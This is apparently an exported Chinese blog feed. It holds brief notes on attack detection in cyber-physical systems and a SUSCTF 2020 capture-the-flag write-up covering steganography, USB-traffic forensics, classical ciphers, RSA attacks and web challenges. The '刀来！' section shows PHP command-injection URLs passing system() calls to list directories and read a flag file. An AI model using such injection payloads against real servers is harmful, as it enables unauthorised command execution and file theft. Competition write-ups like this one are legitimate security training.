<h3 id="1-信息物理系统建模"><a href="#1-信息物理系统建模" class="headerlink" title="1 信息物理系统建模"></a>1 信息物理系统建模</h3><h4 id="1-1-物理进程模型"><a href="#1-1-物理进程模型" class="headerlink" title="1.1 物理进程模型"></a>1.1 物理进程模型</h4><p>用微分/差分方程组进行描述：比如线性系统的状态空间模型</p>
<h4 id="1-2-信息传输处理进程模型"><a href="#1-2-信息传输处理进程模型" class="headerlink" title="1.2 信息传输处理进程模型"></a>1.2 信息传输处理进程模型</h4><p>用编码解码，加解密进行描述</p>
<h4 id="1-3-攻击的具象"><a href="#1-3-攻击的具象" class="headerlink" title="1.3 攻击的具象"></a>1.3 攻击的具象</h4><ul>
<li>作用到进程的未知输入</li>
<li>对传输过程的破坏</li>
<li>对传输信息的篡改</li>
</ul>
<h4 id="1-4-系统建模"><a href="#1-4-系统建模" class="headerlink" title="1.4 系统建模"></a>1.4 系统建模</h4><p>$$<br>\begin{cases}<br>\dot{x}(t)=Ax(t)+Bu(t)+Dv(t),\<br>y(t)=Cx(t).<br>\end{cases}\tag{1}<br>$$</p>
<p>x 为系统状态，u 为已知输入，v 为未知攻击，y 为可测量的系统输出</p>
<h3 id="2-有限时间检测器"><a href="#2-有限时间检测器" class="headerlink" title="2 有限时间检测器"></a>2 有限时间检测器</h3><p>针对公式 (1) 提出检测器<br>$$<br>\begin{cases}<br>\dot{z}=Fz(t)+HBu(t)+Ly(t),\ \ \ \ \ \ \ \ \ \ \ (观测器状态) \<br>\widehat{x}=M[z(t)-F^{\tau}z(t-\tau)] \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ (系统估计值)<br>\end{cases}\tag{2}<br>$$<br>由可测量的<strong>系统输出</strong>和<strong>已知输入</strong>获取观测器状态，检测器可以在未知攻击的值不为 0 时将其检测出来</p>
<h3 id="3-观测器：对有限时间检测器的改进"><a href="#3-观测器：对有限时间检测器的改进" class="headerlink" title="3 观测器：对有限时间检测器的改进"></a>3 观测器：对有限时间检测器的改进</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2020</title>
    <url>/2020/10/20/SUS2020/</url>
    <content><![CDATA[<h4 id="分数-3287"><a href="#分数-3287" class="headerlink" title="分数 3287"></a>分数 3287</h4><h4 id="排名-15"><a href="#排名-15" class="headerlink" title="排名 15"></a>排名 15</h4><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="[Misc]签到"></a>[Misc]签到</h4><p>SUSCTF{Welcome_t0_SUSCTF}</p>
<h4 id="Misc-爆破鬼才请求出战"><a href="#Misc-爆破鬼才请求出战" class="headerlink" title="[Misc]爆破鬼才请求出战"></a>[Misc]爆破鬼才请求出战</h4><h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>打开会有提示<code>m?s?_?tt4?k!</code><br><img src="/2020/10/20/SUS2020/baopo.png">  </p>
</li>
<li><p>利用ARCHPR掩码攻击获取密码<br><img src="/2020/10/20/SUS2020/%E6%8E%A9%E7%A0%81%E6%94%BB%E5%87%BB.png"><br><code>m4sk_att4Ck!</code>  </p>
</li>
<li><p>解压得到LSB.png，利用StegSolve提取隐写数据，保存成文本，得到<br><code>S&#123;urgdt1&#125;UY_30__sS0a_04mc</code>  </p>
</li>
<li><p>栅栏密码，每组3字<br><code>SUS&#123;Y0u_ar3_g00d_4t_m1sc&#125;</code></p>
</li>
</ol>
<h4 id="Misc-签到之公众号"><a href="#Misc-签到之公众号" class="headerlink" title="[Misc]签到之公众号"></a>[Misc]签到之公众号</h4><p>关注公众号，回复flag<br><code>SUSCTF&#123;W3lc0m3_t0_SUSCTF&#125;</code></p>
<h4 id="Misc-Dance-Dance"><a href="#Misc-Dance-Dance" class="headerlink" title="[Misc]Dance_Dance"></a>[Misc]Dance_Dance</h4><h5 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>图片<br><img src="/2020/10/20/SUS2020/The_dancing_men.png">  </p>
</li>
<li><p>利用<a href="https://www.dcode.fr/dancing-men-cipher%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">https://www.dcode.fr/dancing-men-cipher解密得到</a>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pa sswdL etU  </span><br><span class="line">sdanCe</span><br></pre></td></tr></table></figure></li>
<li><p>根据提示“让我们跟着音乐起舞吧！”，使用<code>binwalk</code>查看是否内含文件，发现zip，故<code>dd if=The_dancing_men.png of=f.zip skip=48243 bs=1</code>将压缩包分离出来  </p>
</li>
<li><p>解压发现需要密码，正是<code>LetUsdanCe</code>  </p>
</li>
<li><p>得到音频文件Do_u_know_spectrum.wav，用Audacity打开，并查看频谱图有：<br><img src="/2020/10/20/SUS2020/spec.png">  </p>
</li>
<li><p>扫描二维码得<br><code>SUS&#123;1nt3r35t1nG_5p3ctRum&#125;</code></p>
</li>
</ol>
<h4 id="Misc-balɟ¯ʇuᴉɹԀ"><a href="#Misc-balɟ¯ʇuᴉɹԀ" class="headerlink" title="[Misc]ƃɐlɟ¯ʇuᴉɹԀ"></a>[Misc]ƃɐlɟ¯ʇuᴉɹԀ</h4><h5 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用010Editor查看发现尾部有类似zip文件头的标志，但整个字节流是倒序的，故利用Python顺过来  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\ti_nepo_ot_woh&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> m:</span><br><span class="line">    m.write(binascii.b2a_hex(f))</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(tmp[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\result.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> result:</span><br><span class="line">    result.write(binascii.a2b_hex(tmp[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>得到一个可以正常解压缩的zip文件result.zip，解压缩得到here_are_some_codes.zip和use_zipin_to_get_password.txt，后者中有以下文本  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyud0ko3aMDa1MttNDoaaunr0NtMtw:moy3aryoimi:uu:0m01aiypiuDaMmukaNrNM?M:M:mnnnt1rmDp?001Nanow:u?kN:0ykkyaMDkyMuDNMpuaNDykNm:NmmMMk1pki0idodmanMimupwwDooiy:i:kodmMOOa?k1witMk:aukiiM:iakDmni3w3?mwioiDooM:wiMrm:m0ooO:OokNMykNNwimOak0ddmopOmymuNo1aM0Mdt1?1Domynmnmw:0:o:uD30mDDyi:Dppi3a0Nmi:yOr??OOkdwwip3wr0u3aw1Mw:irrmtpkMd0n0kyD:3y:odnMDuiDNyaNMpyNykm:puw0?:DNrMoMkMDk3Nk03wtiO0mpoyidymtdiiD3O3Oa1yin?o3wDm3:mamduayD0:?iur?uwn:N001uioDa3Dumd3kukmdadmOaodn:iioy:nimnauu31nk0tda?rpoi1i1ioMOmi0MyyMktmNM::mOi3oMyMwMopoMtMu?ka:nmM3D:NyydpuymN1pO0mwoymraDiymMOd:pODuMmy0nDOMO0id3:ydDdrkNi0yoD1imOoDm0kinwyMi?MONm0Nyood:ONDdi:oyw0OM1:?:w?pitkOoa0:dtraiurNyyrN3uw1uwMyDtp10Ma:MMo:moMirupDmioOadOitwDt:yy0D:i3Na:naoMatra1uMrNwndiku3m?mOuda:OM1wnyourkau1dDw:oM:1myoNNDkk:ka3p?rywDwiakDa3d:i0Mo3a3M3aMkry0ionkmO3:?waO:MM0MNNymar3pmudwompwuoo0mOOyDNak1aDiow13yr?mNikw?royu?p1Dkm1k:DDmktty1rrMp?yw3y3kmtpyd:maiwDN0nDOMMkDdy:watMkidu:D:Mi0w00aN:ku:1:a:npaNOD:MpwODaiaDu:dMoaDmayOmwwMtw:0DuM3u?:po0iN:adrt0up?ONiND?nNmtDdronmaOMinm0:miMDyddMpk?doMdi0pNOyoMMuiwt0m3at0uDuid0Nm0iiyi:uOONdiOr3tMpn:kri3kpomioMDmN1Oadaai3Mmwa10OrwriiON:0:uuiDkD?r:iynuMui0yiarMy:O:yMp?mdkDDo33ay:pMnanNDo3nkoiOapt:1MNkr0Di?0mkr0yy:NauatDao0aim0w3i:Op0aikwDmmuoimnyr:Nuo:p3no0yy3apauDua0w0mo0u?3Nup?mo:3NMDwNDtudyi3D:d1DmNaykn1MOMwo?OMpodna1D0:wm0kiDrr?o?ppuwu:tNykDpkpNttnunurd11ptwamrnm3k0a:i1pOpu0mMtua331Ou3OMaONkMaDrMptDO30yDrd1duooOuNODkNkNmi1N0MMiOadmymNnOkwM0MMDkMMMraa1dtwuoDd0a:wkm300O0ymD1w13:oDNayw0i0a0My130Oim0?0urro3OOMp3ukDaiiymnr</span><br></pre></td></tr></table></figure></li>
<li><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">字频统计</a>发现,，按频率从高到底有：  <code>Mima:D0youkNOw3dpr1nt?</code>  </p>
</li>
<li><p>解压成功，获得sus文件，内有G代码，拿到<a href="http://nraynaud.github.io/webgcode">http://nraynaud.github.io/webgcode</a> 执行，Front面有flag，多找两个面放大即可看到被挡住的字符了<br><img src="/2020/10/20/SUS2020/3D.png"><br><code>SUS&#123;3D_Pr1nting_1s_Great&#125;</code>  </p>
</li>
</ol>
<h4 id="Misc-抓住那只小老鼠"><a href="#Misc-抓住那只小老鼠" class="headerlink" title="[Misc]抓住那只小老鼠"></a>[Misc]抓住那只小老鼠</h4><h5 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>用010Editor查看文件，发现尾部有提示：<br><code>D0 y0u Kn0wPseudo encryption?</code></p>
</li>
<li><p>故为zip伪加密，找到504b0102后加密标志位（除了里面包含的一个zip文件外）改为0000，可正常解压，得到keyboard.pcapng和这个小老鼠竟然是个右撇子.zip  </p>
</li>
<li><p>得到的zip仍为加密的，猜测密码应在keyboard.pcapng中  </p>
</li>
<li><p><a href="https://blog.csdn.net/qq_36609913/article/details/78578406">参考1</a><br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">参考2</a><br>从键盘流量中获取信息并导出到usbdata.txt：<code>tshark -r keyboard.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure>

<p><code>PASSWORD  L3T-U5-L00K-4T-TH3-R1GHT-BUTT0N</code><br>实际上应该为小写。。。。l3t-u5-l00k-4t-th3-r1ght-butt0n</p>
<ol start="5">
<li>通过以上密码可直接解压第二个zip，分析mouse.pcapng数据，<code>tshark -r mouse.pcapng -T fields -e usb.capdata &gt; mousedata.txt</code>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;mousedata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line">    <span class="comment"># right button</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :</span><br><span class="line">        <span class="built_in">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>

<p><code>python mouseexp.py &gt; xy.txt</code>得到坐标文本  </p>
<ol start="6">
<li>gnuplot进入，然后<code>plot &quot;xy.txt&quot;</code>得到<br><img src="/2020/10/20/SUS2020/flag.png">  </li>
<li>之前没注意到是右键，采到的左键数据镜像过来是fakeflag，淦。。  </li>
<li>搞错了，刚刚是左键数据，用右键重画一次，垂直镜像一下就能看到<br><img src="/2020/10/20/SUS2020/rotateTrueFlag.png"><br><code>SUS&#123;Hiahia_G0t_1t!&#125;</code></li>
</ol>
<h4 id="Misc-fix-fo"><a href="#Misc-fix-fo" class="headerlink" title="[Misc]fix_fo"></a>[Misc]fix_fo</h4><h5 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>将文件头60改成50即可正常解压  </li>
<li>得到文本<br><code>新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</code>  </li>
<li>用<a href="http://hi.pcmoe.net/buddha.html">新佛曰</a>解密<br><code>SUS&#123;Ta1k_w1th_F0&#125;</code></li>
</ol>
<h4 id="Misc-你还好吗？"><a href="#Misc-你还好吗？" class="headerlink" title="[Misc]你还好吗？"></a>[Misc]你还好吗？</h4><h5 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>解压后发现密码被加密了，用<a href="https://www.splitbrain.org/services/ook">ook解密</a>得到<br><code>Ar3_y0u_OK??</code>  </li>
<li>用其解压Sus.7z得到png，根据提示知其高度不够导致crc校验过不了，用010editor打开，猜测差不多高就直接将高度改为0196就成功了（不行就CRC爆破）<br><img src="/2020/10/20/SUS2020/height.png">  </li>
<li>打开得到flag<br><img src="/2020/10/20/SUS2020/auok.png"><br><code>SUS&#123;wuhu_y0u_f1nD_m3&#125;</code>  </li>
</ol>
<h4 id="Web-Sign-in"><a href="#Web-Sign-in" class="headerlink" title="[Web]Sign_in"></a>[Web]Sign_in</h4><h5 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>直接转到题目地址，有<br><img src="/2020/10/20/SUS2020/%E4%BD%A0%E7%9F%A5%E9%81%93%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%90%97.png">  </li>
<li>F12 - Network - CTRL R<br><img src="/2020/10/20/SUS2020/network.png">  </li>
<li>点击susctf.com，Headers即可查看flag<br><img src="/2020/10/20/SUS2020/header.png"><br><code>SUSCTF&#123;752a426b72b98bf7eda6d5cc53174a5e&#125;</code></li>
</ol>
<h4 id="Web-Script-Kiddle"><a href="#Web-Script-Kiddle" class="headerlink" title="[Web]Script_Kiddle"></a>[Web]Script_Kiddle</h4><h5 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>右键查看源码发现按钮会生成1000以内随机数，且console会回显文本  </li>
<li>F12 - console  </li>
<li>一直“揍他！”就可以拿flag<br><img src="/2020/10/20/SUS2020/%E6%8F%8D%E4%BB%96.png"><br><code>SUSCTF&#123;4cded8ce3b7cdf6e8b44a030dfa15b27&#125;</code></li>
</ol>
<h4 id="Web-刀来！"><a href="#Web-刀来！" class="headerlink" title="[Web]刀来！"></a>[Web]刀来！</h4><h5 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址<br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5.png">  </li>
<li>可以直接执行命令所以<code>http://susctf.com:10005/?z33=system(%22ls%22);</code><br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5ls.png">  </li>
<li>全是文件，也cat不到flag，所以不停往上一级目录查看，直到<code>http://susctf.com:10005/?z33=system(%22ls%20../../../%22);</code><br><img src="/2020/10/20/SUS2020/%E4%B8%89%E7%BA%A7%E7%9B%AE%E5%BD%95.png">  </li>
<li><code>http://susctf.com:10005/?z33=system(%22cat%20../../../flag%22);</code><br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5cat.png">  <blockquote>
<p>SUSCTF{f5f397a37b728d927576ae889b908d17}  </p>
</blockquote>
</li>
</ol>
<h4 id="Web-AT-Field"><a href="#Web-AT-Field" class="headerlink" title="[Web]AT_Field"></a>[Web]AT_Field</h4><h5 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址，输入框只允许2个字符，故F12修改长度为4  </li>
<li>输入flag，点击按钮发现不给flag，直接回车拿到了<br><code>SUSCTF&#123;b8442b229c248ab68061f4602e7e0649&#125;</code></li>
</ol>
<h4 id="Web-first-lesson"><a href="#Web-first-lesson" class="headerlink" title="[Web]first_lesson"></a>[Web]first_lesson</h4><h5 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>后回显  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z33 is feiwu</span><br><span class="line">rmb is shenxian</span><br><span class="line">use POST method to submit aa </span><br></pre></td></tr></table></figure></li>
<li><p>打开Fiddler，点击左下角开始capturing，刷新<code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>，双击新出现的结果<br><img src="/2020/10/20/SUS2020/fiddler.png">  </p>
</li>
<li><p>复制get请求内容<br><img src="/2020/10/20/SUS2020/get.png">  </p>
</li>
<li><p>POST数据，注意添加content-type，且&amp;用url编码<br><img src="/2020/10/20/SUS2020/post.png">  </p>
</li>
<li><p>execute并查看结果  </p>
</li>
<li><p>解码<br><img src="/2020/10/20/SUS2020/decode.png">  </p>
</li>
<li><p>在textview中查看<br><img src="/2020/10/20/SUS2020/whois.png"></p>
</li>
</ol>
<h4 id="Crypto-嘤语"><a href="#Crypto-嘤语" class="headerlink" title="[Crypto]嘤语"></a>[Crypto]嘤语</h4><h5 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>注意到后面两个月亮表情对应左右花括号，猜测最后一句话是flag的密文，同时花括号前面有六个字符，应该就是SUSCTF，看1和3字符重复，验证了猜想基本正确  </li>
<li>因为开着PyCharm就正好直接拿进来CTRL R做替换了，替换思路是：先将SUSCTF对应的表情替换掉，发现前面还有个<code>F***:</code>显然是对应”FLAG”，然后有”表情+F”的组合是”OF”，再对其他字符做填充，如CLASSICAL，CIPHER等，就可以逐渐恢复出flag了  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&quot;I😊⬜CRYPTOGRAPHY,⬜A⬜CLASSICAL⬜CIPHER⬜IS⬜A⬜TYPE⬜OF⬜CIPHER⬜THAT⬜😴AS⬜USE🙃⬜HISTORICALLY⬜😅UT⬜😊O😴⬜HAS⬜FALLE😊,⬜FOR⬜THE⬜😭OST⬜PART,⬜I😊TO⬜🙃ISUSE.⬜I😊⬜CO😊TRAST⬜TO⬜😭O🙃ER😊⬜CRYPTOGRAPHIC⬜ALGORITH😭S,⬜😭OST⬜CLASSICAL⬜CIPHERS⬜CA😊⬜😅E⬜PRACTICALLY⬜CO😭PUTE🙃⬜A😊🙃⬜SOL😮E🙃⬜😅Y⬜HA😊🙃.⬜HO😴E😮ER,⬜THEY⬜ARE⬜ALSO⬜USUALLY⬜😮ERY⬜SI😭PLE⬜TO⬜😅REA😷⬜😴ITH⬜😭O🙃ER😊⬜TECH😊OLOGY.⬜THE⬜TER😭⬜I😊CLU🙃ES⬜THE⬜SI😭PLE⬜SYSTE😭S⬜USE🙃⬜SI😊CE⬜GREE😷⬜A😊🙃⬜RO😭A😊⬜TI😭ES,⬜THE⬜ELA😅ORATE⬜RE😊AISSA😊CE⬜CIPHERS,⬜😴ORL🙃⬜😴AR⬜II⬜CRYPTOGRAPHY⬜SUCH⬜AS⬜THE⬜E😊IG😭A⬜😭ACHI😊E⬜A😊🙃⬜😅EYO😊🙃.⬜HERE⬜IS⬜YOUR⬜FLAG:⬜SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;.&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;</code></p>
<h4 id="Crypto-RSSA"><a href="#Crypto-RSSA" class="headerlink" title="[Crypto]RSSA"></a>[Crypto]RSSA</h4><h5 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>大数分解，拿去factor和yafu都解不出来，所以<a href="http://yulige.top/?p=752#childRSA213pt_38solvers">Pollard p-1</a>  </li>
<li>因为hint值太大了，这就意味着d2会很小，那么就是<a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener攻击</a>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> generalProject.rsa_wiener_attack.RSAwienerHacker <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">3060339854667248593045439268471563618105947041290938481437325848798323938532596377624638621097456963253037677560878331946238549090696901239603144752351327600586368201100237434726169753646811787604853964860726798254336863499145531199565109074254779876690101270258127715336168391612300304331101360275482233310674932139807609972793497538656646848415992324215456226007567101761161788925814705494294400067939912005412022042668218198383402940130898294895649777977189323224263157282092376424922614684186453440072575716268919964175691720756763119457242056477670177079759247122219232189306055203008434843682933286646266213545529</span></span><br><span class="line">c1 = <span class="number">3034469135294668773920507296346350907742457191809402478651651217514955247855057533285593352174358500799066186911877764529883001921082777805708529058571202933977282137208978346424554431043278549161483292409933547041813315975823969433401643242339079668276684778997460119485703198793575336626432882752487489338573038850368920863161207166964460908530752241974904789636070196624073568755921923220050851726340905458096183125781252224795386550130576788381853678417208871830497382705959067939298640356768911183934418681683145007224744048971106742284638285450915496700589787964160222024466744139469925581347695004377624495126915</span></span><br><span class="line">n2 = <span 